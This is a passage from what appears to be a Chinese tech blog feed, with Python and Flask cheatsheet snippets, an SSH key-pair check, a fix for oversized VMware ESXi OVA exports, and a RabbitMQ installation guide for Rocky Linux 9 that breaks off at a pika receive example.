<h1><span id="数据结构和算法">数据结构和算法</span></h1><h2><span id="一组序列保存最后n个元素">一组序列，保存最后N个元素</span></h2><p>使用deque，指定maxlen参数的值为N，例如：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(dq)</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="查找最大或最小的n个元素">查找最大或最小的N个元素</span></h2><p>除了直接排序，还可以利用heaq模块的nlargest()和nsmallest()方法，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [3, 5, 2, 4, 1]</span><br><span class="line">&gt;&gt;&gt; smallest = heapq.nsmallest(3, nums)</span><br><span class="line">&gt;&gt;&gt; print(smallest)</span><br><span class="line">[1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; largest = heapq.nlargest(3, nums)</span><br><span class="line">&gt;&gt;&gt; print(largest)</span><br><span class="line">[5, 4, 3]</span><br></pre></td></tr></table></figure>

<h1><span id="常用库和使用方法示例">常用库和使用方法示例</span></h1><h2><span id="引用别的模块logging">引用别的模块Logging</span></h2><p>logging_config.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取当前脚本所在目录的上级目录作为日志目录</span></span><br><span class="line">log_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), <span class="string">&#x27;logs&#x27;</span>)</span><br><span class="line">os.makedirs(log_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 日志文件路径</span></span><br><span class="line">log_file = os.path.join(log_dir, <span class="string">&#x27;app.log&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    level=logging.DEBUG,  <span class="comment"># 设置日志级别</span></span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>,  <span class="comment"># 设置日志格式</span></span><br><span class="line">    handlers=[</span><br><span class="line">        logging.FileHandler(log_file),  <span class="comment"># 将日志写入文件</span></span><br><span class="line">        logging.StreamHandler()  <span class="comment"># 同时将日志输出到控制台（可选）</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取logger对象</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure>
<p>module_a.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging_config  <span class="comment"># 导入日志配置模块</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用配置好的logger</span></span><br><span class="line">logger = logging_config.logger</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">some_function</span>():</span><br><span class="line">    logger.info(<span class="string">&quot;This is an info message from module_a.&quot;</span>)</span><br><span class="line">    <span class="comment"># ... 其他代码</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    some_function()</span><br></pre></td></tr></table></figure>
<p>module_b.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging_config  <span class="comment"># 同样导入日志配置模块</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用配置好的logger</span></span><br><span class="line">logger = logging_config.logger</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">another_function</span>():</span><br><span class="line">    logger.error(<span class="string">&quot;This is an error message from module_b.&quot;</span>)</span><br><span class="line">    <span class="comment"># ... 其他代码</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    another_function()</span><br></pre></td></tr></table></figure>
<p>在这个例子中，logging_config.py负责配置日志，包括设置日志文件的路径。module_a.py和module_b.py都导入了logging_config模块，并使用其中配置好的logger对象来记录日志。这样，所有的日志都会写入到同一个日志文件中（在这个例子中是logs&#x2F;app.log），并且日志格式和级别都是一致的。<br>请注意，这种方法假设你的项目结构允许logging_config.py中的__file__变量正确地定位到日志目录的上级目录。如果你的项目结构不同，你可能需要调整log_dir的计算方式。此外，如果你想要在每个模块中都有自己独立的日志配置（比如不同的日志文件路径或格式），你可能需要为每个模块分别配置日志。</p>
<h2><span id="用queue实现生产者和消费者">用Queue实现生产者和消费者</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"># 创建一个队列对象</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"># 生产者线程函数</span><br><span class="line">def producer(q, count):</span><br><span class="line">    for i in range(count):</span><br><span class="line">        item = random.randint(1, 100)  # 生产一个随机整数作为产品</span><br><span class="line">        q.put(item)  # 将产品放入队列</span><br><span class="line">        print(f&quot;Produced &#123;item&#125;&quot;)</span><br><span class="line">        time.sleep(random.uniform(0.1, 0.5))  # 模拟生产时间</span><br><span class="line"></span><br><span class="line"># 消费者线程函数</span><br><span class="line">def consumer(q):</span><br><span class="line">    while True:</span><br><span class="line">        item = q.get()  # 从队列中获取产品</span><br><span class="line">        if item is None:  # 如果获取到的是 None，则停止消费</span><br><span class="line">            break</span><br><span class="line">        print(f&quot;Consumed &#123;item&#125;&quot;)</span><br><span class="line">        time.sleep(random.uniform(0.1, 0.5))  # 模拟消费时间</span><br><span class="line">        q.task_done()  # 通知队列任务已完成</span><br><span class="line"></span><br><span class="line"># 创建并启动生产者线程</span><br><span class="line">producer_thread = threading.Thread(target=producer, args=(q, 10))</span><br><span class="line">producer_thread.start()</span><br><span class="line"></span><br><span class="line"># 创建并启动消费者线程</span><br><span class="line">consumer_thread = threading.Thread(target=consumer, args=(q,))</span><br><span class="line">consumer_thread.start()</span><br><span class="line"></span><br><span class="line"># 等待生产者线程完成</span><br><span class="line">producer_thread.join()</span><br><span class="line"></span><br><span class="line"># 在生产者完成后，向队列发送一个 None 来通知消费者停止</span><br><span class="line">q.put(None)</span><br><span class="line"></span><br><span class="line"># 等待消费者线程完成队列中的所有任务</span><br><span class="line">q.join()</span><br><span class="line"></span><br><span class="line"># 注意：在实际应用中，消费者线程可能需要一种更优雅的方式来停止，</span><br><span class="line"># 而不是依赖于队列中的 None 值。这可以通过设置一个全局停止标志或使用其他线程同步机制来实现。</span><br></pre></td></tr></table></figure>

<h1><span id="把list转换为字符串">把list转换为字符串</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str = &#x27; &#x27;.join(list)</span><br></pre></td></tr></table></figure>

<h2><span id="判断变量是否为none">判断变量是否为None</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if x is not None:</span><br><span class="line">if not (x is None):</span><br></pre></td></tr></table></figure>

<h2><span id="使用global修改全局变量">使用global修改全局变量</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">x = 0</span><br><span class="line">def inc():</span><br><span class="line">    global x</span><br><span class="line">    x = x + 1</span><br><span class="line">inc()</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<h2><span id="格式化打印字符串">格式化打印字符串</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello &#123;language&#125;&#x27;</span>.<span class="built_in">format</span>(language=<span class="string">&#x27;Python&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="print打印不换行">print打印不换行</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&#x27;a&#x27;, end=&#x27; &#x27;)</span><br><span class="line">print(&#x27;b&#x27;, end=&#x27; &#x27;)</span><br></pre></td></tr></table></figure>

<h2><span id="判断文件是否存在">判断文件是否存在</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">abspath = <span class="string">&#x27;/etc/v1-config/xxx&#x27;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(abspath) == <span class="literal">False</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;file not exist&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="逐行读取文件内容记录到数组-再按原序去重">逐行读取文件内容，记录到数组, 再按原序去重</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(domains_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        domain_list.append(line.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    directOutDomains = <span class="built_in">list</span>(<span class="built_in">set</span>(domain_list)) <span class="comment"># de‑duplicate with original order</span></span><br><span class="line">    directOutDomains.sort(key=domain_list.index)</span><br></pre></td></tr></table></figure>

<h2><span id="批量执行shell语句">批量执行Shell语句</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;sed -i &#x27;$a\\acl direct-out-servers dstdomain &#123;domain_list&#125;&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                     sed -i &#x27;$a\\cache_peer 127.0.0.1 parent 8081 0 no-query default login=&#123;u&#125;:&#123;p&#125;&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                     sed -i &#x27;$a\\cache_peer_access 127.0.0.1 allow !direct-out-servers&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                     sed -i &#x27;$a\\cache_peer_access 127.0.0.1 deny all&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                     sed -i &#x27;$a\\always_direct allow direct-out-servers&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                     sed -i &#x27;$a\\never_direct allow !direct-out-servers&#x27; &#123;cfg_path&#125;; \</span></span><br><span class="line"><span class="string">                  &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(domain_list=domain_list_str, cfg_path=SQUID_CONF_PATH, u=generic_proxy.user, p=generic_proxy.passwd)</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure>

<h2><span id="base64-decoding-end-encoding">base64 decoding end encoding</span></h2><p>decoding</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">proxy_user = base64.b64decode(proxy_user_base64 + <span class="string">&#x27;===&#x27;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>encoding</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">sample_string = <span class="string">&quot;GeeksForGeeks is the best&quot;</span></span><br><span class="line">sample_string_bytes = sample_string.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">  </span><br><span class="line">base64_bytes = base64.b64encode(sample_string_bytes)</span><br><span class="line">base64_string = base64_bytes.decode(<span class="string">&quot;ascii&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="给切片命名使代码清晰可读">给切片命名，使代码清晰可读</span></h2><p>使用内置的slice函数创建切片，而不是硬编码下标，从而增强代码可读性，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; ip=&quot;&lt;127.0.0.1&gt;&quot;</span><br><span class="line">&gt;&gt;&gt; GET_IP = slice(1,-1)</span><br><span class="line">&gt;&gt;&gt; ip[GET_IP]</span><br><span class="line">&#x27;127.0.0.1&#x27;</span><br></pre></td></tr></table></figure>

<h2><span id="解压序列可迭代对象赋值给多个变量">解压序列，可迭代对象赋值给多个变量</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; year, month, day = [2002, 6, 10]</span><br><span class="line">&gt;&gt;&gt; print(year, month, day)</span><br><span class="line">2002 6 10</span><br></pre></td></tr></table></figure>

<p>可以用占位符，丢弃其他的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [2002,6,10]</span><br><span class="line">print(year)</span><br><span class="line">2002</span><br></pre></td></tr></table></figure>

<h2><span id="解压可迭代对象赋值给多个变量">解压可迭代对象赋值给多个变量</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">L = [1,2,3,4,5]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line">print(middle)</span><br><span class="line">&gt;&gt;&gt; [2,3,4]</span><br></pre></td></tr></table></figure>

<h1><span id="flask-cheetsheet">Flask Cheetsheet</span></h1><h2><span id="flask返回状态码">Flask返回状态码</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/empty-200&#x27;)</span><br><span class="line">def empty_200():</span><br><span class="line">    return Response(status=200)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<h2><span id="flask返回字符串状态码">Flask返回字符串+状态码</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/return-string&#x27;)</span><br><span class="line">def return_string():</span><br><span class="line">    return &quot;Hello, this is a string!&quot;, 200</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<h2><span id="flask返回json状态码">Flask返回JSON+状态码</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/return-json&#x27;)</span><br><span class="line">def return_json():</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;message&quot;: &quot;Hello, this is JSON!&quot;,</span><br><span class="line">        &quot;status&quot;: &quot;success&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(data), 200</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p>Flask设置响应体, 响应头, 状态码: <a href="https://cloud.tencent.com/developer/article/1546924">https://cloud.tencent.com/developer/article/1546924</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>cheetsheet</tag>
      </tags>
  </entry>
  <entry>
    <title>判断SSH的公钥和私钥是否为一对的方法</title>
    <url>/2024/1217233035.html</url>
    <content><![CDATA[<h2><span id="使用sshkey-gen命令判断">使用sshkey-gen命令判断</span></h2><p>使用ssh-keygen -y命令可以从私钥文件中提取公钥。例如: 你的私钥文件是id_rsa，执行如下命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -y -f id_rsa &gt; extracted_pubkey.pub</span><br></pre></td></tr></table></figure>
<p>将提取的公钥保存到extracted_pubkey.pub文件。再和你的公钥文件比较，看文件内容是否相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff extracted_pubkey.pub id_rsa.pub</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware ESXi导出OVA文件中含有ISO文件，如何去除这个ISO</title>
    <url>/2024/1217233142.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>我在VMware ESXi上，用官方Rockylinux minimal ISO装了一台Linux机器。导出OVA文件发现大小有3个G。查看OVA文件，发现有个ISO文件占了2G，这个ISO文件用不到，如何删除？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tar tvf va.ova</span><br><span class="line">-rw-r--r-- someone/someone 9876 2024-12-17 02:27 va.ovf</span><br><span class="line">-rw-r--r-- someone/someone  345 2024-12-17 02:27 va.mf</span><br><span class="line">-rw-r--r-- someone/someone 1829634048 2024-12-17 02:27 va-file1.iso</span><br><span class="line">-rw-r--r-- someone/someone 1332535296 2024-12-17 02:28 va-disk1.vmdk</span><br><span class="line">-rw-r--r-- someone/someone       8684 2024-12-17 02:28 va-file2.nvram</span><br></pre></td></tr></table></figure>
<h2><span id="解决方法">解决方法</span></h2><p>Poweroff虚拟机，修改虚拟机配置，把光驱删掉，再重新导出OVA即可 </p>
<span id="more"></span>
<p><img data-src="/2024/1217233142/image1.png" alt="image1.png"></p>
<p>新的OVA大小只有1.3G，且ISO成功删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar tvf ./va.ova</span><br><span class="line">-rw-r--r-- someone/someone 9226 2024-12-17 02:41 va.ovf</span><br><span class="line">-rw-r--r-- someone/someone  258 2024-12-17 02:41 va.mf</span><br><span class="line">-rw-r--r-- someone/someone 1332317696 2024-12-17 02:42 va-disk1.vmdk</span><br><span class="line">-rw-r--r-- someone/someone       8684 2024-12-17 02:42 va-file1.nvram</span><br></pre></td></tr></table></figure>

<h2><span id="vmware-esxi导出ova的方法">VMware ESXi导出OVA的方法</span></h2><p>除了在UI上导出，也可以通过Vmware PowerCLI和ovftool导出OVA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwsh</span><br><span class="line">PS&gt; Set-PowerCLIConfiguration -InvalidCertificateAction &quot;Ignore&quot; -Confirm:$false | Out-Null</span><br><span class="line">PS&gt; connect-viserver &#123;your_viserver_ip&#125; -User root -Password &#123;your_password&#125;  </span><br><span class="line">PS&gt; ovftool -dm=thin --noSSLVerify --powerOffSource vi://root:&#123;your_password&#125;@&#123;viserver_ip&#125;//&#123;your_vm_name&#125; va.ova</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://duiz.net/3491.html">https://duiz.net/3491.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Rocky Linux 9安装RabbitMQ</title>
    <url>/2024/1218212631.html</url>
    <content><![CDATA[<h1><span id="环境准备">环境准备</span></h1><p>Rocky Linux 9</p>
<h1><span id="安装步骤">安装步骤</span></h1><h2><span id="安装signing-keys签名密钥">安装Signing Keys(签名密钥)</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">rpm --import https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-erlang/gpg.E495BB49CC4BBE5B.key</span><br><span class="line">rpm --import https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-server/gpg.9F4587F226208342.key</span><br></pre></td></tr></table></figure>

<h2><span id="创建repo文件">创建repo文件</span></h2><p>在&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下创建一个名为rabbitmq.repo的文件，并添加以下内容：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># In /etc/yum.repos.d/rabbitmq.repo</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line">## Zero dependency Erlang RPM</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">[modern-erlang]</span><br><span class="line">name=modern-erlang-el9</span><br><span class="line"># uses a Cloudsmith mirror @ yum1.novemberain.com.</span><br><span class="line"># Unlike Cloudsmith, it does not have traffic quotas</span><br><span class="line">baseurl=https://yum1.novemberain.com/erlang/el/9/$basearch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-erlang/gpg.E495BB49CC4BBE5B.key</span><br><span class="line">gpgcheck=1</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br><span class="line"></span><br><span class="line">[modern-erlang-noarch]</span><br><span class="line">name=modern-erlang-el9-noarch</span><br><span class="line"># uses a Cloudsmith mirror @ yum1.novemberain.com.</span><br><span class="line"># Unlike Cloudsmith, it does not have traffic quotas</span><br><span class="line">baseurl=https://yum1.novemberain.com/erlang/el/9/noarch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-erlang/gpg.E495BB49CC4BBE5B.key</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">gpgcheck=1</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br><span class="line"></span><br><span class="line">[modern-erlang-source]</span><br><span class="line">name=modern-erlang-el9-source</span><br><span class="line"># uses a Cloudsmith mirror @ yum1.novemberain.com.</span><br><span class="line"># Unlike Cloudsmith, it does not have traffic quotas</span><br><span class="line">baseurl=https://yum1.novemberain.com/erlang/el/9/SRPMS</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-erlang/gpg.E495BB49CC4BBE5B.key</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">gpgcheck=1</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##</span><br><span class="line">## RabbitMQ Server</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">[rabbitmq-el9]</span><br><span class="line">name=rabbitmq-el9</span><br><span class="line">baseurl=https://yum1.novemberain.com/rabbitmq/el/9/$basearch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line"># Cloudsmith&#x27;s repository key and RabbitMQ package signing key</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-server/gpg.9F4587F226208342.key</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">gpgcheck=1</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br><span class="line"></span><br><span class="line">[rabbitmq-el9-noarch]</span><br><span class="line">name=rabbitmq-el9-noarch</span><br><span class="line">baseurl=https://yum1.novemberain.com/rabbitmq/el/9/noarch</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line"># Cloudsmith&#x27;s repository key and RabbitMQ package signing key</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-server/gpg.9F4587F226208342.key</span><br><span class="line">       https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc</span><br><span class="line">gpgcheck=1</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br><span class="line"></span><br><span class="line">[rabbitmq-el9-source]</span><br><span class="line">name=rabbitmq-el9-source</span><br><span class="line">baseurl=https://yum1.novemberain.com/rabbitmq/el/9/SRPMS</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://dl.cloudsmith.io/public/rabbitmq/rabbitmq-server/gpg.9F4587F226208342.key</span><br><span class="line">gpgcheck=0</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">metadata_expire=300</span><br><span class="line">pkg_gpgcheck=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br></pre></td></tr></table></figure>

<h2><span id="安装依赖">安装依赖</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf update -y</span><br><span class="line">sudo dnf install -y socat logrotate</span><br><span class="line">sudo dnf install -y erlang</span><br></pre></td></tr></table></figure>
<p>校验Erlang</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">erl</span><br><span class="line">Erlang/OTP 27 [erts-15.2] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit:ns]</span><br><span class="line"></span><br><span class="line">Eshell V15.2 (press Ctrl+G to abort, type help(). for help)</span><br><span class="line">1&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="安装rabbitmq">安装RabbitMQ</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install rabbitmq-server</span><br></pre></td></tr></table></figure>

<h2><span id="启动rabbitmq-设置开机自启动">启动RabbitMQ, 设置开机自启动</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start rabbitmq-server</span><br><span class="line">systemctl enable rabbitmq-server</span><br></pre></td></tr></table></figure>

<h2><span id="配置rabbitmq">配置RabbitMQ</span></h2><h3><span id="启动admin页面插件">启动admin页面插件</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure>
<h3><span id="添加管理员admin">添加管理员admin</span></h3><p>RabbitMQ自带一个guest用户，默认用户名和密码都是guest。 出于安全考虑，建议创建新的管理员账户并删除或禁用guest账户。  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rabbitmqctl delete_user guest</span><br><span class="line">rabbitmqctl add_user admin your_admin_password</span><br><span class="line">rabbitmqctl set_user_tags admin administrator</span><br><span class="line">rabbitmqctl set_permissions -p / admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;</span><br></pre></td></tr></table></figure>
<p>其中, your_admin_password是你为管理员账户设置的密码，&#x2F;是默认的虚拟主机名称。 操作完成后查看用户列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rabbitmqctl list_users</span><br><span class="line">Listing users ...</span><br><span class="line">user    tags</span><br><span class="line">admin   [administrator]</span><br></pre></td></tr></table></figure>
<p>访问管理页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;your_ip_address&gt;:15672/</span><br></pre></td></tr></table></figure>

<h2><span id="示例-使用python的pika库操作rabbitmq">示例: 使用python的pika库操作rabbitmq</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pika</span><br></pre></td></tr></table></figure>
<p>send.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pika</span><br><span class="line"></span><br><span class="line">credentials = pika.PlainCredentials(&quot;admin&quot;, &quot;your_password&quot;)</span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(&#x27;localhost&#x27;, credentials=credentials))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=&#x27;hello&#x27;)</span><br><span class="line">channel.basic_publish(exchange=&#x27;&#x27;,</span><br><span class="line">                      routing_key=&#x27;hello&#x27;,</span><br><span class="line">                      body=&#x27;Hello World!&#x27;)</span><br><span class="line">print(&quot; [x] Sent &#x27;Hello World!&#x27;&quot;)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
<p>receive.py</p>
